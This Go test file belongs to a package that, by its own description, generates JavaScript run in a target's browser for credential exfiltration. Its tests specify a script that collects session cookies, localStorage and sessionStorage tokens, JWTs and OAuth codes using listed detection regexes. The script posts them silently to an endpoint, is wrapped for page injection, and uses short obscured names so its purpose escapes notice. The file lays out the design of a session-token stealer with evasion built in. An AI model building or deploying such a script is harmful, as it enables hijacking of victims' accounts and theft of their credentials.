// Package capture provides JavaScript code generation for form field capture and
// submission interception. The generated JavaScript runs in the target's browser
// to enumerate form fields and intercept form submissions for credential exfiltration.
package capture

import (
	"regexp"
	"strings"
	"testing"
)

// TestGenerateSessionCaptureJS_OutputStructure verifies the output structure of the session capture JS.
func TestGenerateSessionCaptureJS_OutputStructure(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        true,
		CaptureLocalStorage:   true,
		CaptureSessionStorage: true,
		CaptureURLTokens:      true,
	}

	tests := []struct {
		name             string
		expectedPatterns []string
	}{
		{
			name: "all features enabled",
			expectedPatterns: []string{
				"(function(){",
				"var cfg=",
				"function _ut()",
				"function _m()",
				"function _ck()",
				"function _ls()",
				"function _ss()",
				"function _s(",
				"function _()",
				"XMLHttpRequest",
				"URLSearchParams",
				"JSON.stringify",
				"})();",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			js := GenerateSessionCaptureJS(config)

			// Verify IIFE wrapper
			if !strings.HasPrefix(js, "(function(){") {
				t.Errorf("JS should start with IIFE wrapper")
			}

			// Verify it ends properly
			if !strings.HasSuffix(js, "})();") {
				t.Errorf("JS should end with });)")
			}

			// Check for expected patterns
			for _, pat := range tt.expectedPatterns {
				if !strings.Contains(js, pat) {
					t.Errorf("missing expected pattern: %s", pat)
				}
			}

			// Verify no global namespace pollution (vars use var inside IIFE)
			// The main global is 'cfg' object
		})
	}
}

// TestGenerateSessionCaptureJS_ConfigFlags verifies each capture type can be toggled independently.
func TestGenerateSessionCaptureJS_ConfigFlags(t *testing.T) {
	tests := []struct {
		name     string
		config   SessionCaptureConfig
		expected []string
	}{
		{
			name: "only cookies enabled",
			config: SessionCaptureConfig{
				CaptureCookies: true,
			},
			expected: []string{"ep:", "tp:", "ck:true"},
		},
		{
			name: "only localStorage enabled",
			config: SessionCaptureConfig{
				CaptureLocalStorage: true,
			},
			expected: []string{"ep:", "tp:", "ls:true"},
		},
		{
			name: "only sessionStorage enabled",
			config: SessionCaptureConfig{
				CaptureSessionStorage: true,
			},
			expected: []string{"ep:", "tp:", "ss:true"},
		},
		{
			name: "only URL tokens enabled",
			config: SessionCaptureConfig{
				CaptureURLTokens: true,
			},
			expected: []string{"ep:", "tp:", "ut:true"},
		},
		{
			name: "all enabled",
			config: SessionCaptureConfig{
				CaptureCookies:        true,
				CaptureLocalStorage:   true,
				CaptureSessionStorage: true,
				CaptureURLTokens:      true,
			},
			expected: []string{"ep:", "tp:", "ck:true", "ls:true", "ss:true", "ut:true"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			js := GenerateSessionCaptureJS(tt.config)

			for _, exp := range tt.expected {
				if !strings.Contains(js, exp) {
					t.Errorf("JS should contain '%s'", exp)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_AllDisabled verifies empty config produces minimal JS.
func TestGenerateSessionCaptureJS_AllDisabled(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        false,
		CaptureLocalStorage:   false,
		CaptureSessionStorage: false,
		CaptureURLTokens:      false,
	}

	js := GenerateSessionCaptureJS(config)

	// Verify IIFE wrapper
	if !strings.HasPrefix(js, "(function(){") {
		t.Errorf("JS should start with IIFE wrapper")
	}

	if !strings.HasSuffix(js, "})();") {
		t.Errorf("JS should end with });)")
	}

	// With all disabled, only basic setup should be present
	expected := []string{"ep:", "tp:", "function _()"}
	for _, exp := range expected {
		if !strings.Contains(js, exp) {
			t.Errorf("JS should contain '%s'", exp)
		}
	}

	// With all disabled, should NOT have capture feature flags
	unexpected := []string{"ck:true", "ls:true", "ss:true", "ut:true"}
	for _, unexp := range unexpected {
		if strings.Contains(js, unexp) {
			t.Errorf("JS should NOT contain '%s' when all disabled", unexp)
		}
	}
}

// TestGenerateSessionCaptureJS_CookieCapturePatterns verifies cookie capture code generation.
func TestGenerateSessionCaptureJS_CookieCapturePatterns(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies: true,
	}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name     string
		contains []string
	}{
		{
			name: "cookie enumeration",
			contains: []string{
				"document.cookie",
				"split(';')",
				"function _ck()",
			},
		},
		{
			name: "auth cookie detection",
			contains: []string{
				"JSESSIONID",
				"PHPSESSID",
				"ASP",
				"NET_SessionId",
				"_session_id",
				"__Secure-",
				"__Host-",
				"token",
				"auth",
				"session",
				"jwt",
				"sid",
			},
		},
		{
			name: "cookie metadata",
			contains: []string{
				"domain",
				"path",
				"window.location.hostname",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, c := range tt.contains {
				if !strings.Contains(js, c) {
					t.Errorf("JS should contain '%s' for cookie capture", c)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_LocalStoragePatterns verifies localStorage capture code generation.
func TestGenerateSessionCaptureJS_LocalStoragePatterns(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureLocalStorage: true,
	}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name     string
		contains []string
	}{
		{
			name: "localStorage enumeration",
			contains: []string{
				"localStorage",
				"for(var k in localStorage)",
				"function _ls()",
			},
		},
		{
			name: "auth key detection",
			contains: []string{
				"token",
				"auth",
				"jwt",
				"session",
				"bearer",
				"api_key",
				"access_token",
				"refresh_token",
				"id_token",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, c := range tt.contains {
				if !strings.Contains(js, c) {
					t.Errorf("JS should contain '%s' for localStorage capture", c)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_SessionStoragePatterns verifies sessionStorage capture code generation.
func TestGenerateSessionCaptureJS_SessionStoragePatterns(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureSessionStorage: true,
	}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name     string
		contains []string
	}{
		{
			name: "sessionStorage enumeration",
			contains: []string{
				"sessionStorage",
				"for(var k in sessionStorage)",
				"function _ss()",
			},
		},
		{
			name: "auth key detection",
			contains: []string{
				"token",
				"auth",
				"jwt",
				"session",
				"bearer",
				"api_key",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, c := range tt.contains {
				if !strings.Contains(js, c) {
					t.Errorf("JS should contain '%s' for sessionStorage capture", c)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_URLTokenPatterns verifies URL token capture code generation.
func TestGenerateSessionCaptureJS_URLTokenPatterns(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureURLTokens: true,
	}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name     string
		contains []string
	}{
		{
			name: "URLSearchParams parsing",
			contains: []string{
				"URLSearchParams",
				"window.location.search",
				"function _ut()",
			},
		},
		{
			name: "OAuth token parameters",
			contains: []string{
				"code",
				"access_token",
				"id_token",
				"refresh_token",
				"auth_code",
				"authorization_code",
			},
		},
		{
			name: "fragment/hash parsing",
			contains: []string{
				"window.location.hash",
				"substring(1)",
				"forEach",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, c := range tt.contains {
				if !strings.Contains(js, c) {
					t.Errorf("JS should contain '%s' for URL token capture", c)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_AntiDetection verifies anti-fingerprinting features.
func TestGenerateSessionCaptureJS_AntiDetection(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        true,
		CaptureLocalStorage:   true,
		CaptureSessionStorage: true,
		CaptureURLTokens:      true,
	}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name        string
		expected    []string
		notExpected []string
	}{
		{
			name:        "no obvious naming",
			expected:    []string{"function _", "function _ck", "function _ls", "function _ss", "function _s", "cfg"},
			notExpected: []string{"sessionCapture", "stealCookies", "exfiltrate", "capture_session", "exfil", "steal_"},
		},
		{
			name:        "short variable names",
			expected:    []string{"function _ut(", "function _m(", "function _ck(", "function _ls(", "function _ss(", "function _s("},
			notExpected: []string{"function CaptureCookies", "function GetLocalStorage", "function ExfiltrateData"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, exp := range tt.expected {
				if !strings.Contains(js, exp) {
					t.Errorf("JS should contain '%s' for anti-detection", exp)
				}
			}

			for _, notExp := range tt.notExpected {
				if strings.Contains(js, notExp) {
					t.Errorf("JS should NOT contain '%s' for anti-detection", notExp)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_DataFormat verifies the JSON data structure.
func TestGenerateSessionCaptureJS_DataFormat(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        true,
		CaptureLocalStorage:   true,
		CaptureSessionStorage: true,
		CaptureURLTokens:      true,
	}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name     string
		contains []string
	}{
		{
			name: "session data array",
			contains: []string{
				"s:",
				"dt:", // data type
				"k:",  // key
				"v:",  // value
				"md:", // metadata
				"ts:", // is_time_sensitive
			},
		},
		{
			name: "data type values",
			contains: []string{
				"'cookie'",
				"'local_storage'",
				"'session_storage'",
				"'oauth_token'",
			},
		},
		{
			name: "metadata fields",
			contains: []string{
				"url:",
				"ua:", // user agent
				"ts:", // timestamp
			},
		},
		{
			name: "tracking token",
			contains: []string{
				"t:",
				"function _t()",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, c := range tt.contains {
				if !strings.Contains(js, c) {
					t.Errorf("JS should contain '%s' for data format", c)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_Size verifies output size is under 3KB.
func TestGenerateSessionCaptureJS_Size(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        true,
		CaptureLocalStorage:   true,
		CaptureSessionStorage: true,
		CaptureURLTokens:      true,
	}

	js := GenerateSessionCaptureJS(config)

	// Minified JS should be under 3KB (3072 characters)
	maxSize := 3072
	if len(js) > maxSize {
		t.Errorf("JS length %d exceeds max size %d", len(js), maxSize)
	}

	// Expected size range for full config
	expectedMin := 1500
	expectedMax := 2800
	if len(js) < expectedMin || len(js) > expectedMax {
		t.Errorf("JS length %d outside expected range [%d, %d]", len(js), expectedMin, expectedMax)
	}
}

// TestGenerateSessionCaptureJS_AutoDetectionPatterns verifies JWT and cookie auto-detection.
func TestGenerateSessionCaptureJS_AutoDetectionPatterns(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        true,
		CaptureLocalStorage:   true,
		CaptureSessionStorage: true,
		CaptureURLTokens:      true,
	}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name     string
		contains []string
	}{
		{
			name: "JWT regex pattern",
			contains: []string{
				"eyJ",
				"eyJ[A-Za-z0-9_-]+",
				"jwtr=",
			},
		},
		{
			name: "cookie auto-detection patterns",
			contains: []string{
				"/^(JSESSIONID|PHPSESSID|ASP\\.NET_SessionId|connect\\.sid|_session_id)$/i",
				"/__Secure-|^__Host-/i",
				"/token|auth|session|jwt|sid/i",
			},
		},
		{
			name: "localStorage/sessionStorage auto-detection",
			contains: []string{
				"/token|auth|jwt|session|bearer|api_key|access_token|refresh_token|id_token/i",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, c := range tt.contains {
				if !strings.Contains(js, c) {
					t.Errorf("JS should contain '%s' for auto-detection", c)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_CustomEndpoint verifies custom session endpoint embedding.
func TestGenerateSessionCaptureJS_CustomEndpoint(t *testing.T) {
	config := SessionCaptureConfig{
		SessionEndpoint: "/custom/session-api",
		TrackingParam:   "sess",
	}

	js := GenerateSessionCaptureJS(config)

	// Verify custom endpoint
	if !strings.Contains(js, "ep:'/custom/session-api'") {
		t.Errorf("JS should contain custom endpoint")
	}

	// Verify custom tracking param
	if !strings.Contains(js, "tp:'sess'") {
		t.Errorf("JS should contain custom tracking param")
	}

	// Verify config object includes both
	if !strings.Contains(js, "ep:") || !strings.Contains(js, "tp:") {
		t.Errorf("JS should include both ep and tp in cfg")
	}
}

// TestGenerateSessionCaptureJS_IIFEWrapped verifies IIFE wrapping pattern.
func TestGenerateSessionCaptureJS_IIFEWrapped(t *testing.T) {
	config := SessionCaptureConfig{}

	js := GenerateSessionCaptureJS(config)

	// Verify IIFE starts with (function(){
	if !strings.HasPrefix(js, "(function(){") {
		t.Errorf("JS should start with (function(){, got: %s", js[:15])
	}

	// Verify IIFE ends with })
	if !strings.HasSuffix(js, "})();") {
		t.Errorf("JS should end with }), got: %s", js[len(js)-20:])
	}

	// Verify no global namespace pollution
	// Variables should use var inside IIFE
	globalVarMatches := strings.Count(js, "var ")
	if globalVarMatches == 0 {
		t.Errorf("JS should have var declarations")
	}

	// window references should only be for specific APIs
	windowRefs := strings.Count(js, "window.")
	if windowRefs > 0 {
		// window references are expected for location, navigator, etc.
	}
}

// TestGenerateSessionCaptureJS_DetectionTiming verifies DOM ready timing.
func TestGenerateSessionCaptureJS_DetectionTiming(t *testing.T) {
	config := SessionCaptureConfig{}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name     string
		contains []string
	}{
		{
			name: "DOMContentLoaded handler",
			contains: []string{
				"DOMContentLoaded",
				"addEventListener('DOMContentLoaded'",
			},
		},
		{
			name: "immediate execution when ready",
			contains: []string{
				"document.readyState==='loading'",
				"else",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, c := range tt.contains {
				if !strings.Contains(js, c) {
					t.Errorf("JS should contain '%s' for timing", c)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureScriptTag tests the script tag generation.
func TestGenerateSessionCaptureScriptTag(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        true,
		CaptureLocalStorage:   true,
		CaptureSessionStorage: true,
		CaptureURLTokens:      true,
		SessionEndpoint:       "/api/session-capture",
		TrackingParam:         "_t",
	}

	tag := GenerateSessionCaptureScriptTag(config)

	// Verify tag structure
	if !strings.HasPrefix(tag, "<script>") {
		t.Errorf("Tag should start with <script>, got: %s", tag[:20])
	}

	if !strings.HasSuffix(tag, "</script>") {
		t.Errorf("Tag should end with </script>, got: %s", tag[len(tag)-20:])
	}

	// Verify JS is inside tag
	jsContent := strings.TrimPrefix(tag, "<script>")
	jsContent = strings.TrimSuffix(jsContent, "</script>")

	if !strings.HasPrefix(jsContent, "(function(){") {
		t.Errorf("JS content should start with IIFE")
	}

	// Verify config flags are present
	if !strings.Contains(jsContent, "ep:") || !strings.Contains(jsContent, "tp:") {
		t.Errorf("JS should contain endpoint and tracking params")
	}
}

// TestGenerateSessionCaptureJS_MinifiedCharacteristics verifies minification features.
func TestGenerateSessionCaptureJS_MinifiedCharacteristics(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        true,
		CaptureLocalStorage:   true,
		CaptureSessionStorage: true,
		CaptureURLTokens:      true,
	}

	js := GenerateSessionCaptureJS(config)

	// Verify no source maps
	if strings.Contains(js, "sourceMappingURL") {
		t.Errorf("Minified JS should not contain sourceMappingURL")
	}

	// Count variable declarations with short names
	varMatches := regexp.MustCompile(`var ([_a-zA-Z]\w*)=`).FindAllStringSubmatch(js, -1)
	for _, match := range varMatches {
		varName := match[1]
		if len(varName) > 4 {
			t.Errorf("Var '%s' is too long for minified code (max 4 chars)", varName)
		}
	}

	// Verify function names are short
	funcNames := []string{"function _", "function _ck", "function _ls", "function _ss", "function _s"}
	for _, fn := range funcNames {
		if !strings.Contains(js, fn) {
			t.Errorf("JS should contain short function name '%s'", fn)
		}
	}
}

// TestGenerateSessionCaptureJS_CaptureDataStructure verifies the complete data structure sent.
func TestGenerateSessionCaptureJS_CaptureDataStructure(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        true,
		CaptureLocalStorage:   true,
		CaptureSessionStorage: true,
		CaptureURLTokens:      true,
	}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name     string
		contains []string
	}{
		{
			name: "session array construction",
			contains: []string{
				"d=[]",
				"d.push.apply",
				"_s(d)",
			},
		},
		{
			name: "endpoint POST request",
			contains: []string{
				"POST",
				"application/json",
				"JSON.stringify({s:",
			},
		},
		{
			name: "metadata object",
			contains: []string{
				"function _m()",
				"url:window.location.pathname",
				"ua:navigator.userAgent",
				"ts:Date.now()",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, c := range tt.contains {
				if !strings.Contains(js, c) {
					t.Errorf("JS should contain '%s' for data structure", c)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_DataTransmission verifies data transmission behavior.
func TestGenerateSessionCaptureJS_DataTransmission(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        true,
		CaptureLocalStorage:   true,
		CaptureSessionStorage: true,
		CaptureURLTokens:      true,
	}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name        string
		expected    []string
		notExpected []string
	}{
		{
			name:        "single POST request",
			expected:    []string{"XMLHttpRequest", "open('POST'", "send("},
			notExpected: []string{"setInterval", "setInterval", "Promise", "async "},
		},
		{
			name:        "silent failure",
			expected:    []string{"send("},
			notExpected: []string{"throw ", "console.error", "alert("},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, exp := range tt.expected {
				if !strings.Contains(js, exp) {
					t.Errorf("JS should contain '%s' for transmission", exp)
				}
			}

			for _, notExp := range tt.notExpected {
				if strings.Contains(js, notExp) {
					t.Errorf("JS should NOT contain '%s' for transmission", notExp)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_TimeoutBehavior verifies POST timeout handling.
func TestGenerateSessionCaptureJS_TimeoutBehavior(t *testing.T) {
	config := SessionCaptureConfig{
		CaptureCookies:        true,
		CaptureLocalStorage:   true,
		CaptureSessionStorage: true,
		CaptureURLTokens:      true,
	}

	js := GenerateSessionCaptureJS(config)

	tests := []struct {
		name     string
		contains []string
	}{
		{
			name: "asynchronous transmission",
			contains: []string{
				"!0",
				"XMLHttpRequest",
			},
		},
		{
			name: "no blocking on send",
			contains: []string{
				"send(",
				"return c",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, c := range tt.contains {
				if !strings.Contains(js, c) {
					t.Errorf("JS should contain '%s' for timeout behavior", c)
				}
			}
		})
	}
}

// TestGenerateSessionCaptureJS_ParameterizedTests runs table-driven tests for config variations.
func TestGenerateSessionCaptureJS_ParameterizedTests(t *testing.T) {
	tests := []struct {
		name   string
		config SessionCaptureConfig
		checks []func(t *testing.T, js string)
	}{
		{
			name: "minimal config",
			config: SessionCaptureConfig{
				CaptureCookies: true,
			},
			checks: []func(t *testing.T, js string){
				func(t *testing.T, js string) {
					if !strings.Contains(js, "ck:true") {
						t.Errorf("Should include cookie capture flag")
					}
					if strings.Contains(js, "ls:true") {
						t.Errorf("Should NOT include localStorage flag")
					}
				},
			},
		},
		{
			name: "all capture types",
			config: SessionCaptureConfig{
				CaptureCookies:        true,
				CaptureLocalStorage:   true,
				CaptureSessionStorage: true,
				CaptureURLTokens:      true,
			},
			checks: []func(t *testing.T, js string){
				func(t *testing.T, js string) {
					if !strings.Contains(js, "ck:true") ||
						!strings.Contains(js, "ls:true") ||
						!strings.Contains(js, "ss:true") ||
						!strings.Contains(js, "ut:true") {
						t.Errorf("All capture flags should be present")
					}
				},
				func(t *testing.T, js string) {
					if len(js) > 3072 {
						t.Errorf("JS should be under 3072 chars, got %d", len(js))
					}
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			js := GenerateSessionCaptureJS(tt.config)
			for _, check := range tt.checks {
				check(t, js)
			}
		})
	}
}
